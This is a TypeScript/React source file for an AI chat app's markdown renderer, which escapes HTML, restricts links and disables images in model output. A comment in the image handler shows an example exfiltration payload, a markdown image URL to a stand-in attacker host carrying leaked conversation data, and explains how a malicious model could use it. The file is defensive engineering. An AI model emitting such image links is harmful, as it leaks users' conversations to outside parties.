"use client";

/**
 * Supa AI — Markdown renderer (Phase 3 chat).
 *
 * Configures `react-markdown` for safe, attractive rendering of AI
 * assistant messages:
 *
 *   - **No HTML** — the default `react-markdown` behavior escapes HTML
 *     (we do NOT pass `rehype-raw`). AI output is treated as untrusted
 *     text; a `<script>` tag in a model response is rendered as the
 *     literal string `<script>`, not executed.
 *   - **No images** — a custom `img` component returns plain text so a
 *     malicious model can't inject external tracking pixels or
 *     phishing images via markdown `![](url)` syntax.
 *   - **Safe links** — every link opens in a new tab with
 *     `rel="noopener noreferrer"`. The default `urlTransform` already
 *     filters dangerous protocols (`javascript:`, `data:`, etc.).
 *   - **Code blocks** — rendered via `react-syntax-highlighter`'s
 *     `PrismAsyncLight` (so the heavy language registry is loaded
 *     on-demand via dynamic import, keeping the initial bundle slim).
 *     Each block has a header bar with the language label + a copy
 *     button.
 *   - **Inline code** — rendered as a plain `<code>` chip.
 *
 * GFM (tables, strikethrough, task lists) is intentionally NOT enabled
 * because `remark-gfm` is not in the dependency tree. The base
 * `react-markdown` handles paragraphs, headings, bold/italic, lists,
 * blockquotes, inline code, code blocks, and links — the common
 * syntax models use in chat. We still style `<table>` defensively in
 * case a model emits the raw HTML-ish table syntax react-markdown
 * recognizes out of the box.
 *
 * @module @/components/chat/markdown-renderer
 */
import * as React from "react";
import Markdown from "react-markdown";
import { Check, Copy } from "lucide-react";
import { PrismAsyncLight as SyntaxHighlighter } from "react-syntax-highlighter";
import { oneDark } from "react-syntax-highlighter/dist/esm/styles/prism";

import { cn } from "@/lib/utils";
import { Button } from "@/components/ui/button";

/** Props accepted by the markdown renderer. */
export interface MarkdownRendererProps {
  /** The markdown source to render. */
  content: string;
  /** Optional class name on the wrapping `<div>`. */
  className?: string;
}

/**
 * Extract the language label from a `className` like `"language-tsx"`.
 * Returns `null` when the language isn't declared (inline code or an
 * unlabeled fence).
 */
function extractLanguage(className: string | undefined): string | null {
  if (!className) return null;
  const match = /language-(\w+)/.exec(className);
  return match ? match[1] : null;
}

/**
 * Copy the given text to the clipboard + return whether it succeeded.
 * Falls back to a hidden-textarea + `execCommand` when the async
 * clipboard API is unavailable (older browsers, insecure contexts).
 */
async function copyToClipboard(text: string): Promise<boolean> {
  try {
    if (typeof navigator !== "undefined" && navigator.clipboard) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch {
    // Fall through to the legacy execCommand path.
  }
  try {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.style.position = "fixed";
    textarea.style.opacity = "0";
    document.body.appendChild(textarea);
    textarea.select();
    const ok = document.execCommand("copy");
    document.body.removeChild(textarea);
    return ok;
  } catch {
    return false;
  }
}

/** A single code block with a header (language label + copy button). */
function CodeBlock({
  language,
  code,
}: {
  language: string | null;
  code: string;
}) {
  const [copied, setCopied] = React.useState(false);

  const handleCopy = React.useCallback(async () => {
    const ok = await copyToClipboard(code);
    if (ok) {
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1500);
    }
  }, [code]);

  return (
    <div className="group/code my-3 overflow-hidden rounded-lg border border-border bg-[#282c34]">
      <div className="flex items-center justify-between border-b border-white/10 px-3 py-1.5">
        <span className="font-mono text-xs text-zinc-400">
          {language ?? "text"}
        </span>
        <Button
          type="button"
          variant="ghost"
          size="sm"
          onClick={handleCopy}
          aria-label="Copy code"
          className="h-7 gap-1.5 px-2 text-xs text-zinc-300 hover:bg-white/10 hover:text-zinc-100"
        >
          {copied ? (
            <>
              <Check className="size-3.5" aria-hidden="true" />
              Copied
            </>
          ) : (
            <>
              <Copy className="size-3.5" aria-hidden="true" />
              Copy
            </>
          )}
        </Button>
      </div>
      <SyntaxHighlighter
        language={language ?? "text"}
        style={oneDark}
        customStyle={{
          margin: 0,
          background: "transparent",
          padding: "0.875rem 1rem",
          fontSize: "0.8125rem",
          lineHeight: 1.5,
        }}
        codeTagProps={{
          style: {
            fontFamily: "var(--font-geist-mono), monospace",
          },
        }}
        PreTag="div"
      >
        {code}
      </SyntaxHighlighter>
    </div>
  );
}

/** The stable component map passed to `<Markdown components={...} />`. */
const MARKDOWN_COMPONENTS = {
  // Code — fenced (```lang) OR inline (`code`). In react-markdown v10
  // there's no `inline` prop; we detect block vs inline by checking
  // whether the `className` carries a `language-` prefix OR the
  // content contains a newline.
  code(props: React.HTMLAttributes<HTMLElement> & {
    className?: string;
    children?: React.ReactNode;
  }) {
    const { className: cls, children, ...rest } = props;
    const text = String(children ?? "").replace(/\n$/, "");
    const language = extractLanguage(cls);
    const isInline = !language && !text.includes("\n");
    if (isInline) {
      return (
        <code
          className="rounded bg-muted px-1.5 py-0.5 font-mono text-[0.85em] text-foreground"
          {...rest}
        >
          {children}
        </code>
      );
    }
    return <CodeBlock language={language} code={text} />;
  },
  // Pre — react-markdown wraps fenced code in <pre><code>. We already
  // render the wrapping div in `CodeBlock`, so render the children
  // directly without the extra `<pre>` wrapper.
  pre(props: React.HTMLAttributes<HTMLElement>) {
    const { children, ...rest } = props;
    return (
      <div {...rest} className="!m-0 !p-0">
        {children}
      </div>
    );
  },
  // Links — open in a new tab + strip referrer.
  a(props: React.AnchorHTMLAttributes<HTMLAnchorElement>) {
    const { href, children, ...rest } = props;
    if (!href) return <span>{children}</span>;
    return (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        className="text-brand underline decoration-brand/40 underline-offset-2 hover:decoration-brand"
        {...rest}
      >
        {children}
      </a>
    );
  },
  // Images — disabled for security. A malicious model could otherwise
  // embed `![](https://attacker.com/track.png?leak=...)` to exfiltrate
  // the conversation. Render the alt text (or the raw URL) as plain
  // text instead. React 19 widens `src` to `string | Blob`; we coerce
  // to a string so the JSX is always text-only.
  img(props: React.ImgHTMLAttributes<HTMLImageElement>) {
    const { alt, src } = props;
    const srcStr = typeof src === "string" ? src : "";
    return (
      <span className="text-muted-foreground italic">
        [image: {alt || srcStr || "disabled"}]
      </span>
    );
  },
  h1: (props: React.HTMLAttributes<HTMLHeadingElement>) => (
    <h1 className="mt-4 mb-2 text-lg font-semibold first:mt-0" {...props} />
  ),
  h2: (props: React.HTMLAttributes<HTMLHeadingElement>) => (
    <h2 className="mt-4 mb-2 text-base font-semibold first:mt-0" {...props} />
  ),
  h3: (props: React.HTMLAttributes<HTMLHeadingElement>) => (
    <h3 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0" {...props} />
  ),
  h4: (props: React.HTMLAttributes<HTMLHeadingElement>) => (
    <h4 className="mt-3 mb-1.5 text-sm font-medium first:mt-0" {...props} />
  ),
  h5: (props: React.HTMLAttributes<HTMLHeadingElement>) => (
    <h5 className="mt-3 mb-1 text-sm font-medium first:mt-0" {...props} />
  ),
  h6: (props: React.HTMLAttributes<HTMLHeadingElement>) => (
    <h6
      className="mt-3 mb-1 text-xs font-medium uppercase tracking-wide text-muted-foreground first:mt-0"
      {...props}
    />
  ),
  p: (props: React.HTMLAttributes<HTMLParagraphElement>) => (
    <p className="mb-3 leading-relaxed last:mb-0" {...props} />
  ),
  ul: (props: React.HTMLAttributes<HTMLUListElement>) => (
    <ul className="mb-3 ml-5 list-disc space-y-1 last:mb-0" {...props} />
  ),
  ol: (props: React.HTMLAttributes<HTMLOListElement>) => (
    <ol className="mb-3 ml-5 list-decimal space-y-1 last:mb-0" {...props} />
  ),
  li: (props: React.HTMLAttributes<HTMLLIElement>) => (
    <li className="leading-relaxed" {...props} />
  ),
  blockquote: (props: React.HTMLAttributes<HTMLQuoteElement>) => (
    <blockquote
      className="my-3 border-l-2 border-brand/40 pl-3 text-muted-foreground italic"
      {...props}
    />
  ),
  hr: (props: React.HTMLAttributes<HTMLHRElement>) => (
    <hr className="my-4 border-border" {...props} />
  ),
  table: (props: React.HTMLAttributes<HTMLTableElement>) => (
    <div className="my-3 overflow-x-auto">
      <table
        className="w-full border-collapse text-xs [&_td]:border [&_td]:border-border [&_td]:px-2 [&_td]:py-1 [&_th]:border [&_th]:border-border [&_th]:bg-muted [&_th]:px-2 [&_th]:py-1"
        {...props}
      />
    </div>
  ),
  strong: (props: React.HTMLAttributes<HTMLElement>) => (
    <strong className="font-semibold" {...props} />
  ),
  em: (props: React.HTMLAttributes<HTMLElement>) => (
    <em className="italic" {...props} />
  ),
} as const;

/**
 * Render markdown content safely. Used by {@link MessageBubble} for
 * assistant messages (and user messages when they contain markdown
 * syntax the user typed intentionally).
 */
export function MarkdownRenderer({
  content,
  className,
}: MarkdownRendererProps) {
  return (
    <div
      className={cn(
        "prose-chat max-w-none text-sm leading-relaxed text-foreground",
        className,
      )}
    >
      <Markdown components={MARKDOWN_COMPONENTS}>{content}</Markdown>
    </div>
  );
}
